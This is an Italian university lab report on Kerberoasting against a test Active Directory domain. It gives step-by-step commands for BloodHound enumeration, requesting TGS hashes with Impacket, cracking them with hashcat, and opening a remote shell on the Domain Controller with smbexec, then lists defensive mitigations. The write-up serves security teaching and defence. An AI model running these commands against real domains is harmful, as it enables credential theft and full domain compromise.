# Steal or Forge Kerberos Tickets: Kerberoasting
## Giovanni Bernobic - Cybersecurity - A.a. 2025/2026
## Introduzione

Active Directory (AD) è il servizio di directory che gestisce identità, autenticazione e autorizzazioni nella stragrande maggioranza delle reti aziendali Windows. La sua centralità lo rende anche il bersaglio principale di un attaccante interno: compromettere il Domain Controller (DC) equivale al controllo totale dell'organizzazione.

Questo report documenta una catena d'attacco completa contro un dominio AD allestito in laboratorio. Lo scenario parte da un foothold realistico, credenziali di un utente di dominio non privilegiato, plausibilmente ottenute tramite phishing e mostra come un attaccante possa, usando esclusivamente strumenti pubblici e funzionalità legittime del protocollo, mappare la struttura del dominio con BloodHound CE, identificare un account di servizio Kerberoastable, craccare offline il suo Ticket Granting Service (TGS) e aprire una shell remota sul Domain Controller.

Nessuna vulnerabilità zero-day è stata sfruttata: la compromissione nasce dalla composizione di un meccanismo di protocollo (Kerberos concede TGS a qualunque utente autenticato), una misconfigurazione di configurazione (account di servizio con SPN e privilegi eccessivi) e una password debole.

## 2. Threat Model

**Punto di partenza**: credenziali in chiaro dell'utente di dominio `giovanni` (password `Password1!`) e connettività di rete verso il DC. Questo modella l'esito positivo di una campagna di phishing/spear-phishing.

**Obiettivo**: ottenere esecuzione di codice privilegiata sul Domain Controller `DC01.units.local`.

**Vincoli:** nessun accesso fisico; nessun privilegio amministrativo iniziale; nessun exploit di codice — tutto avviene rimanendo nei normali protocolli di dominio (SMB, LDAP, Kerberos).

**Mapping MITRE ATT\&CK:** Valid Accounts (T1078) → Discovery via LDAP → Kerberoasting (T1558.003) → Remote Code Execution via SMB.

## 3. Setup dell'ambiente

Il laboratorio è realizzato su **Oracle VirtualBox** con due macchine virtuali su una rete *Host-Only* isolata (`192.168.56.0/24`):

- **DC01** — Windows Server 2022 (versione di valutazione), Domain Controller del dominio `units.local`, IP `192.168.56.10` (2 CPU, 4 GB RAM). Svolge anche il ruolo di server DNS — condizione strutturale per AD: senza i record SRV pubblicati dal DNS (`_kerberos._tcp.units.local`, `_ldap._tcp.dc._msdcs.units.local`), client e servizi non possono localizzare il DC.
- **KALI** — Kali Linux rolling, macchina dell'attaccante, IP `192.168.56.20` (4 CPU, 6 GB RAM — più potenza per il cracking offline).

Sul DC sono stati creati: l'utente `giovanni` (utente non privilegiato, password debole), e l'account di servizio `svc_sql` a cui è associato uno SPN (`MSSQL/DC01.units.local:1433`) e la password `P4ssw0rd2!`. `svc_sql` è membro del gruppo **Domain Admins** — misconfigurazione deliberata che in ambienti reali si riscontra quando gli amministratori assegnano privilegi eccessivi per comodità.

### 3.1 Setup Windows Server 2022
Particolare attenzione alla configurazione dell'ambiente Windows e alla creazione degli utenti e gruppi al suo interno.


## 4. Verifica del foothold e sincronizzazione temporale

Prima di procedere, l'attaccante verifica la validità delle credenziali usando **NetExec**:

```bash
nxc smb 192.168.56.10 -u giovanni -p 'Password1!'
```

L'output conferma l'autenticazione riuscita e restituisce il nome NetBIOS del dominio e la versione del sistema operativo. Le credenziali non consentono accessi amministrativi, ma sono sufficienti per interrogare LDAP e richiedere ticket Kerberos.

Un passaggio tecnico critico è la sincronizzazione dell'orologio di Kali con quello del DC: Kerberos rifiuta i ticket se lo skew temporale tra client e KDC supera 5 minuti (errore `KRB_AP_ERR_SKEW`). L'ora del DC viene letta tramite nmap e impostata sulla macchina attaccante:

```bash
DCTIME=$(nmap -sV -p 88 192.168.56.10 2>/dev/null | grep "server time" | grep -oP '\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}')
sudo date -u -s "$DCTIME"


## 5. Enumerazione del dominio con BloodHound CE

**BloodHound CE** è uno strumento di graph-analysis per AD: il collector **bloodhound-python** interroga LDAP con le credenziali dell'utente di basso livello e scarica tutte le relazioni del dominio (utenti, gruppi, computer, GPO, ACL) in un archivio ZIP di file JSON. BloodHound li ingerisce in un database a grafo e visualizza i *percorsi d'attacco* come archi colorati.

```bash
bloodhound-python -u giovanni -p 'Password1!' -d units.local \
  -ns 192.168.56.10 -c All --zip
```

Il flag `-c All` raccoglie tutti i metodi disponibili (GroupMembers, LocalAdmin, RDP, DCOM, LoggedOn, ObjectProps, ACL). Il flag `--zip` comprime i JSON in un unico archivio importabile.

BloodHound CE viene avviato in Docker:

```bash
sudo ./bloodhound-cli start
```

Dopo l'upload dello ZIP all'interfaccia su `http://localhost:8080`, si eseguono le query pre-built. Due risultano decisive:

**Query Cypher per account Kerberoastable:**

```cypher
MATCH (u:User)
WHERE u.hasspn = true AND u.enabled = true
AND NOT u.objectid ENDS WITH "-502"
AND NOT COALESCE(u.gsma, false) = true
AND NOT COALESCE(u.msa, false) = true
RETURN u LIMIT 100
```

Questa query restituisce `svc_sql`: un utente abilitato con SPN registrato, non è né il KDC (objectid `-502`) né un Group Managed Service Account — candidato perfetto per Kerberoasting.

La query **"Shortest Paths to Domain Admins"** rivela poi che `svc_sql` è membro diretto di `Domain Admins`: la sua compromissione garantisce immediatamente privilegi massimi.



## 6. Kerberoasting: estrazione e cracking del TGS

Il **Kerberoasting** sfrutta una caratteristica intrinseca del protocollo Kerberos: qualunque utente di dominio autenticato può richiedere al KDC un TGS per qualsiasi SPN registrato nel dominio. Il TGS è cifrato con l'hash NTLM (RC4) o la chiave AES della password dell'account associato a quell'SPN. L'hash può essere estratto e attaccato *offline*, senza generare ulteriore traffico verso il DC e senza rischiare lockout dell'account.

### 6.1 Richiesta del TGS con Impacket

**Impacket** è una raccolta di classi Python per l'interazione con i protocolli di rete Microsoft (SMB, NTLM, Kerberos). Lo strumento `GetUserSPNs`:

1. Si autentica come `giovanni` e ottiene un TGT dal KDC.
2. Interroga LDAP per enumerare tutti gli account con `servicePrincipalName` non vuoto.
3. Per ciascuno, presenta il TGT e richiede il corrispondente TGS.
4. Salva gli hash nel file di output.

```bash
impacket-GetUserSPNs units.local/giovanni:'Password1!' \
  -dc-ip 192.168.56.10 -request -outputfile hashes.txt
```

Il file `hashes.txt` contiene l'hash nel formato Hashcat. Il prefisso identifica l'algoritmo:

```
$krb5tgs$23$  →  RC4-HMAC  →  hashcat mode 13100
$krb5tgs$18$  →  AES256    →  hashcat mode 19700
```

Il tipo si verifica con:

```bash
head -1 hashes.txt
```



### 6.2 Cracking offline con Hashcat

Il cracking offline è il cuore teorico dell'attacco: a differenza degli attacchi online, che sono rallentati da policy di lockout e rilevamento, qui l'attaccante può tentare miliardi di candidate password al secondo senza che il DC sia coinvolto.

```bash
hashcat -m 13100 -a 0 hashes.txt ./lista-pwd.txt \
  -r /usr/share/hashcat/rules/best66.rule --force
```

`-m 13100` specifica il formato RC4 Kerberos TGS. `-a 0` è l'attacco a dizionario. Il flag `-r` applica le regole `best66`: 66 trasformazioni per parola (cambio case, sostituzione leetspeak, aggiunta di suffissi numerici) che aumentano drasticamente la copertura senza esplodere il keyspace come il brute force puro.

Per visualizzare la password trovata senza rieseguire il cracking:

```bash
hashcat -m 13100 hashes.txt --show
```

La password di `svc_sql` viene recuperata: `P4ssw0rd2!`.




## 7. Post-exploitation: shell remota sul Domain Controller

Con le credenziali di `svc_sql` in chiaro, l'attaccante apre una shell remota sul DC tramite **impacket-smbexec**:

```bash
impacket-smbexec units.local/svc_sql:'P4ssw0rd2!'@192.168.56.10
```

`smbexec` si connette al DC via SMB, crea un servizio Windows temporaneo che lancia `cmd.exe`, invia i comandi attraverso named pipe e rimuove il servizio dopo ogni risposta — tutto senza scrivere file persistenti sul disco. La shell risultante opera nel contesto di `svc_sql`, membro di Domain Admins.

Dalla shell, l'accesso privilegiato viene dimostrato eseguendo:

```bash
shutdown /s /t 0
```

Il Domain Controller si spegne: il dominio è compromesso.



## 8. Conclusioni e mitigazioni

L'attacco non ha richiesto exploit di codice né vulnerabilità zero-day. La compromissione è la composizione di tre elementi: (1) il protocollo Kerberos, by design, concede TGS a qualunque utente autenticato; (2) un account utente con SPN registrato — condizione sufficiente per il Kerberoasting; (3) una password debole, craccabile offline. BloodHound ha reso visibile, in un unico grafo, ciò che in un'analisi manuale richiederebbe decine di query LDAP separate.

**Mitigazioni in un ambiente di produzione:**

- **Group Managed Service Accounts (gMSA):** gli SPN dovrebbero risiedere su gMSA, non su account utente. I gMSA hanno password di 240 caratteri casuali, ruotate automaticamente da AD e mai note agli operatori.
- **AES-only:** deprecare RC4-HMAC e forzare la cifratura AES aumenta esponenzialmente il costo computazionale del cracking offline.
- **Principio del minimo privilegio:** un account di servizio SQL non deve essere Domain Admin. Il tiering amministrativo (workstation / server / DC) limita il blast radius delle compromissioni laterali.
- **Monitoring dell'evento 4769:** ogni richiesta di TGS genera l'evento Windows Security 4769. Un utente che richiede TGS per molti SPN in rapida successione è un segnale Kerberoasting rilevabile con anomaly detection.

La stessa visualizzazione che BloodHound offre all'attaccante è oggi un alleato dei Blue Team: usarla periodicamente per identificare e correggere i percorsi prima che vengano sfruttati è la difesa più efficace.



## Fonti

- SpecterOps, *BloodHound Community Edition — Quickstart*, [https://bloodhound.specterops.io/](https://bloodhound.specterops.io/)
- Impacket, repository ufficiale, [https://github.com/fortra/impacket](https://github.com/fortra/impacket)
- Impacket - Cheatsheet, [https://www.blackhillsinfosec.com/impacket-cheatsheet/](https://www.blackhillsinfosec.com/impacket-cheatsheet/)
- Hashcat, *Example Hashes e modalità di attacco*, [https://hashcat.net/wiki/](https://hashcat.net/wiki/)
- Microsoft Learn, *Active Directory Domain Services Overview, Identity and access*, [https://learn.microsoft.com/it-it/windows-server/identity/identity-and-access](https://learn.microsoft.com/it-it/windows-server/identity/identity-and-access)
- HackTricks, *Kerberoast*, [https://hacktricks.wiki/windows-hardening/active-directory-methodology/kerberoast.html](https://hacktricks.wiki/windows-hardening/active-directory-methodology/kerberoast.html)
- MITRE ATT&CK, T1558.003 *Steal or Forge Kerberos Tickets: Kerberoasting*, [https://attack.mitre.org/techniques/T1558/003/](https://attack.mitre.org/techniques/T1558/003/)
- Slide del corso: *620 — Authentication: NTLM/Kerberos*, *600 — Access Control: Organizations*, *650 — Techniques: Advanced*
- Kerberoasting Attack Simulation in Active Directory, [https://medium.com/@aradityaraj.07/kerberoasting-attack-simulation-in-active-directory-9b39fad6dacb](https://medium.com/@aradityaraj.07/kerberoasting-attack-simulation-in-active-directory-9b39fad6dacb)
- Guide To Active Directory Kerberosting With Kali Linux, [https://logos-red.com/blog/guide-to-active-directory-kerberosting-with-kali-linux/](https://logos-red.com/blog/guide-to-active-directory-kerberosting-with-kali-linux/)
